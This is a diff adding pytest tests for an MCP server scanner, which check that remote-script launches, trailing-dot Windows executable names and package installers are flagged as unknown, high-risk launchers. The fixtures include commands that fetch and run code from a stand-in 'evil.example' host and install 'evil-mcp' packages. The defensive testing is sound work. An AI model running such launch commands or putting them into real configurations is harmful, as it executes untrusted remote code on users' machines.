@@ -1,0 +1,97 @@
+"""Remote scripts, Windows name spellings and package installers are never local programs."""
+
+import json
+from pathlib import Path
+
+import pytest
+
+from nexus_symbiote.core.models import MCPServerComponent
+from nexus_symbiote.scanners.mcp import MCPScanner
+
+
+def scan(project: Path, server: dict) -> tuple[MCPServerComponent, list[str]]:
+    (project / ".mcp.json").write_text(json.dumps({"mcpServers": {"s": server}}))
+    result = MCPScanner().scan(project)
+    record = next(c for c in result.components if isinstance(c, MCPServerComponent))
+    return record, [gap for gap in result.surfaces_excluded if "launcher identity unknown" in gap]
+
+
+def assert_unknown(project: Path, server: dict) -> str:
+    record, gaps = scan(project, server)
+    finding = next((r for r in record.risks if r.category == "launcher_identity"), None)
+    assert finding is not None and gaps, (record.properties, [r.detail for r in record.risks])
+    assert finding.severity.value == "high"
+    assert record.version_pinned is not True and record.package_url is None
+    return finding.detail
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ["run", "https://evil.example/server.py"],
+        ["run", "--script", "https://evil.example/server.py"],
+        ["run", "--with", "mcp==1.2.3", "https://evil.example/server.py"],
+        ["run", "--with", "mcp[cli]==1.2.3", "--script", "http://evil.example/raw/server.py"],
+        ["run", "-"],
+    ],
+)
+def test_uv_run_of_a_remote_script_is_a_url_source(tmp_path, args):
+    assert "URL source" in assert_unknown(tmp_path, {"command": "uv", "args": args})
+
+
+def test_uv_run_of_a_local_script_keeps_its_package(tmp_path):
+    record, gaps = scan(
+        tmp_path, {"command": "uv", "args": ["run", "--with", "mcp==1.2.3", "server.py"]}
+    )
+    assert not gaps
+    assert record.launcher_package == "pypi:mcp"
+
+
+@pytest.mark.parametrize(
+    "command,args",
+    [
+        ("C:\\Program Files\\nodejs\\npx.cmd.", ["-y", "evil-mcp@latest"]),
+        ("npx.cmd. ", ["-y", "evil-mcp@latest"]),
+        ("uvx.exe.", ["evil-mcp"]),
+        ("node.exe.", ["-e", "require('child_process')"]),
+        ("cmd.exe.", ["/c", "@npx", "-y", "evil-mcp@latest"]),
+    ],
+)
+def test_trailing_dots_and_spaces_do_not_hide_a_runner(tmp_path, command, args):
+    record, gaps = scan(tmp_path, {"command": command, "args": args})
+    assert record.properties.get("launcher") != "local" or gaps, record.properties
+    assert record.version_pinned is not True
+
+
+def test_trailing_dot_runner_is_classified_as_that_runner(tmp_path):
+    record, _ = scan(
+        tmp_path,
+        {"command": "C:\\Program Files\\nodejs\\npx.cmd.", "args": ["-y", "evil-mcp@latest"]},
+    )
+    assert record.properties["launcher"] == "npx"
+    assert record.launcher_package == "npm:evil-mcp" and record.version_pinned is False
+
+
+@pytest.mark.parametrize(
+    "command,args",
+    [
+        ("pip", ["install", "evil-mcp"]),
+        ("pip3", ["install", "--index-url", "https://evil.example/simple", "evil"]),
+        ("python", ["-m", "pip", "install", "evil-mcp"]),
+        ("gem", ["install", "evil-mcp"]),
+        ("cargo", ["install", "evil-mcp"]),
+        ("conda", ["install", "-y", "evil-mcp"]),
+        ("nice", ["pip", "install", "evil-mcp"]),
+    ],
+)
+def test_package_installers_are_not_local_programs(tmp_path, command, args):
+    assert_unknown(tmp_path, {"command": command, "args": args})
+
+
+@pytest.mark.parametrize(
+    "command,args",
+    [("pip", ["--version"]), ("cargo", ["run", "--release"]), ("gem", ["list"])],
+)
+def test_installers_that_install_nothing_stay_local(tmp_path, command, args):
+    record, gaps = scan(tmp_path, {"command": command, "args": args})
+    assert not gaps, record.properties
